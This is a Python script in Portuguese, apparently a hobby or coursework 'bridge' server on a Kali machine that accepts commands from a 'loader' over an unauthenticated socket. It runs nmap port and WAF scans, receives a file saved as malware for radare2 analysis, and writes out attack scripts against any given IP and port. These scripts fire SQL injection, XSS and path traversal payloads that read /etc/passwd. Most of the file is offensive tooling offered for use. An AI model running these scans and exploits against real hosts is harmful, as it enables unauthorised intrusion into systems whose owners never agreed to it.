#!/usr/bin/env python3
# Bridge de Network Scanning - Tema 12
# Corre no Kali do Pedro
# "Se o loader pedir, eu dou"

import socket
import subprocess
import os
import time
import threading

PORTA = 9999

# Dicionários para guardar análises
analises_pendentes = {}
analises_concluidas = {}

# ========== COMANDOS EXISTENTES ==========

def corre_nmap_portas(ip):
    try:
        # Escaneia localhost (portas do próprio Kali)
        r = subprocess.run(
            ["nmap", "-F", "127.0.0.1"],  # <-- FIXO
            capture_output=True, text=True, timeout=30
        )
        return r.stdout
    except:
        return "Erro ao correr nmap."

def corre_nmap_waf(ip):
    try:
        # Primeiro descobre portas web
        r = subprocess.run(
            ["nmap", "-p-", "--min-rate", "1000", ip],
            capture_output=True, text=True, timeout=60
        )
        
        # Extrai portas web
        portas_web = []
        for linha in r.stdout.split("\n"):
            if "/tcp" in linha and "open" in linha:
                partes = linha.split("/")
                if len(partes) >= 2:
                    porta = partes[0].strip()
                    if "http" in linha or "www" in linha or porta in ["80", "443", "8080", "8443"]:
                        portas_web.append(porta)
        
        if not portas_web:
            return "Nenhuma porta web encontrada."
        
        # Testa WAF nas portas encontradas
        resultado = ""
        for porta in portas_web[:5]:
            r = subprocess.run(
                ["nmap", "-p", porta, "--script", "http-waf-detect", ip],
                capture_output=True, text=True, timeout=30
            )
            resultado += f"\n[WAF] Porta {porta}:\n{r.stdout}"
        
        return resultado
    except:
        return "Erro ao verificar WAF."

def descomprime_upx(caminho):
    try:
        r = subprocess.run(
            ["upx", "-d", caminho, "-o", caminho + "_descomp"],
            capture_output=True, text=True, timeout=30
        )
        if r.returncode == 0:
            return f"UPX descompressao: {caminho}_descomp"
        else:
            return f"UPX falhou: {r.stderr}"
    except:
        return "Erro no upx"

# ========== RADARE2 EM BACKGROUND ==========

def analisa_radare2_background(caminho, id_analise):
    """Corre em background - não bloqueia o loader"""
    print(f"[*] Background: Radare2 a analisar {caminho}")
    print(f"[*] ID: {id_analise}")
    
    try:
        analises_pendentes[id_analise] = "A analisar..."
        
        # Corre o Radare2
        r = subprocess.run(
            ["r2", "-A", "-q", "-c", "afl; izz; q", caminho],
            capture_output=True, text=True, timeout=600
        )
        
        resultado = r.stdout[:1000]
        
        # Se não deu nada, tenta só strings
        if len(resultado) < 50:
            r2 = subprocess.run(
                ["r2", "-q", "-c", "izz; q", caminho],
                capture_output=True, text=True, timeout=60
            )
            resultado += "\n[STRINGS]\n" + r2.stdout[:500]
        
        analises_concluidas[id_analise] = resultado
        
        if id_analise in analises_pendentes:
            del analises_pendentes[id_analise]
        
        print(f"[*] Background: Análise {id_analise} concluída!")
        
    except Exception as e:
        print(f"[!] Background: Erro {id_analise}: {e}")
        analises_concluidas[id_analise] = f"ERRO: {e}"
        if id_analise in analises_pendentes:
            del analises_pendentes[id_analise]

# ========== RECEBER FICHEIRO ==========

def recebe_ficheiro(conn):
    """Recebe o malware do loader - resposta rápida"""
    try:
        # Tamanho
        dados = conn.recv(1024).decode()
        if not dados:
            return "ERRO: Sem tamanho"
        
        try:
            tamanho = int(dados.strip())
        except:
            return "ERRO: Tamanho inválido"
        
        conn.send(b"OK")
        
        # Recebe o ficheiro
        caminho = "/tmp/malware_recebido.exe"
        f = open(caminho, "wb")
        
        recebido = 0
        while recebido < tamanho:
            dados = conn.recv(4096)
            if not dados:
                break
            f.write(dados)
            recebido += len(dados)
        
        f.close()
        print(f"[*] Ficheiro: {recebido} bytes")
        
        # FIM
        fim = conn.recv(1024).decode()
        if fim != "FIM":
            print(f"[!] Não recebi FIM, recebi: {fim}")
        
        # Resposta rápida
        resultado = f"Ficheiro recebido! {recebido} bytes\n"
        resultado += f"Guardado: {caminho}\n"
        resultado += "\n[!] Radare2 em background...\n"
        
        # Inicia a análise em background
        id_analise = f"analise_{int(time.time())}_{os.path.basename(caminho)}"
        
        thread = threading.Thread(
            target=analisa_radare2_background,
            args=(caminho, id_analise)
        )
        thread.daemon = True
        thread.start()
        
        resultado += f"\nID da análise: {id_analise}\n"
        
        return resultado
        
    except Exception as e:
        return f"ERRO: {e}"

# ========== EXPLOITS ESPECÍFICOS ==========

def gera_exploit_sqli(ip, porta):
    nome = f"/tmp/exploit_sqli_{ip.replace('.', '_')}_{porta}.py"
    
    codigo = f'''#!/usr/bin/env python3
# EXPLOIT SQL INJECTION
# Alvo: {ip}:{porta}

import requests

url = "http://{ip}:{porta}/"
params = ["id", "page", "user", "q", "search"]
payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"]

for p in params:
    for pay in payloads:
        try:
            r = requests.get(f"{{url}}?{{p}}={{pay}}", timeout=5)
            if "error" not in r.text.lower():
                print(f"[+] SQLi: {{url}}?{{p}}={{pay}}")
                break
        except:
            pass
'''
    
    with open(nome, "w") as f:
        f.write(codigo)
    os.chmod(nome, 0o755)
    return f"Exploit SQLi: {nome}"

def gera_exploit_xss(ip, porta):
    nome = f"/tmp/exploit_xss_{ip.replace('.', '_')}_{porta}.py"
    
    codigo = f'''#!/usr/bin/env python3
# EXPLOIT XSS
# Alvo: {ip}:{porta}

import requests
import urllib.parse

url = "http://{ip}:{porta}/"
params = ["q", "search", "s", "query", "keyword"]
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]

for p in params:
    for pay in payloads:
        pay_enc = urllib.parse.quote(pay)
        try:
            r = requests.get(f"{{url}}?{{p}}={{pay_enc}}", timeout=5)
            if pay in r.text:
                print(f"[+] XSS: {{url}}?{{p}}={{pay}}")
                break
        except:
            pass
'''
    
    with open(nome, "w") as f:
        f.write(codigo)
    os.chmod(nome, 0o755)
    return f"Exploit XSS: {nome}"

def gera_exploit_lfi(ip, porta):
    nome = f"/tmp/exploit_lfi_{ip.replace('.', '_')}_{porta}.py"
    
    codigo = f'''#!/usr/bin/env python3
# EXPLOIT LFI
# Alvo: {ip}:{porta}

import requests
import urllib.parse

url = "http://{ip}:{porta}/"
params = ["file", "page", "path", "include", "doc"]
payloads = ["../../../../etc/passwd", "../../../../etc/hosts", "../../../../windows/win.ini"]

for p in params:
    for pay in payloads:
        pay_enc = urllib.parse.quote(pay)
        try:
            r = requests.get(f"{{url}}?{{p}}={{pay_enc}}", timeout=5)
            if "root:x:" in r.text or "localhost" in r.text:
                print(f"[+] LFI: {{url}}?{{p}}={{pay}}")
                break
        except:
            pass
'''
    
    with open(nome, "w") as f:
        f.write(codigo)
    os.chmod(nome, 0o755)
    return f"Exploit LFI: {nome}"

def gera_exploit_generico(ip, porta):
    nome = f"/tmp/exploit_{ip.replace('.', '_')}_{porta}.py"
    
    codigo = f'''#!/usr/bin/env python3
# EXPLOIT GENERICO
# Alvo: {ip}:{porta}

import socket

try:
    s = socket.socket()
    s.settimeout(5)
    s.connect(("{ip}", {porta}))
    s.send(b"EXPLOIT_PAYLOAD")
    resp = s.recv(1024)
    print(resp[:100])
    s.close()
except Exception as e:
    print(f"Erro: {{e}}")
'''
    
    with open(nome, "w") as f:
        f.write(codigo)
    os.chmod(nome, 0o755)
    return f"Exploit genérico: {nome}"

# ========== PROCESSAR COMANDOS ==========

def processa(comando, conn=None):
    """Processa comandos do loader"""
    
    if comando == "ping":
        return "pong"
    
    elif comando.startswith("scan"):
        ip = comando.split(" ")[1]
        return corre_nmap_portas(ip)
    
    elif comando.startswith("waf"):
        ip = comando.split(" ")[1]
        return corre_nmap_waf(ip)
    
    elif comando == "ENVIAR_FICHEIRO":
        if conn:
            return recebe_ficheiro(conn)
        else:
            return "ERRO: Sem conexao"
    
    elif comando.startswith("gerar_exploit"):
        partes = comando.split(" ")
        if len(partes) < 3:
            return "ERRO: gerar_exploit <ip> <porta> [sqli|xss|lfi]"
        
        ip = partes[1]
        porta = partes[2]
        tipo = partes[3] if len(partes) >= 4 else "generic"
        
        if tipo == "sqli":
            return gera_exploit_sqli(ip, porta)
        elif tipo == "xss":
            return gera_exploit_xss(ip, porta)
        elif tipo == "lfi":
            return gera_exploit_lfi(ip, porta)
        else:
            return gera_exploit_generico(ip, porta)
    
    elif comando.startswith("verificar_analise"):
        partes = comando.split(" ")
        if len(partes) >= 2:
            id_analise = partes[1]
            
            if id_analise in analises_concluidas:
                return f"ANALISE_CONCLUIDA\n{analises_concluidas[id_analise]}"
            elif id_analise in analises_pendentes:
                return f"ANALISE_PENDENTE: {analises_pendentes[id_analise]}"
            else:
                return "ANALISE_NAO_ENCONTRADA"
        else:
            return "ERRO: verificar_analise <id>"
    
    else:
        return f"Comando desconhecido: {comando}"

# ========== MAIN ==========

def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORTA))
    s.listen(1)
    
    print("="*50)
    print(" BRIDGE SCAN - KALI DO PEDRO")
    print("="*50)
    print(f"\n[*] A escutar na porta {PORTA}")
    print("\nComandos:")
    print("  ping")
    print("  scan <ip>")
    print("  waf <ip>")
    print("  ENVIAR_FICHEIRO")
    print("  gerar_exploit <ip> <porta> [sqli|xss|lfi]")
    print("  verificar_analise <id>")
    print("="*50)
    
    while True:
        conn, addr = s.accept()
        print(f"\n[*] Ligacao de {addr[0]}")
        
        try:
            comando = conn.recv(4096).decode().strip()
            print(f"[*] Comando: {comando}")
            
            resultado = processa(comando, conn)
            
            if len(resultado) > 4000:
                resultado = resultado[:4000] + "\n[... TRUNCADO ...]"
            
            conn.send(resultado.encode())
            
        except Exception as e:
            print(f"[!] Erro: {e}")
            conn.send(f"ERRO: {e}".encode())
        
        conn.close()
        print("[*] Resposta enviada")


if __name__ == "__main__":
    main()
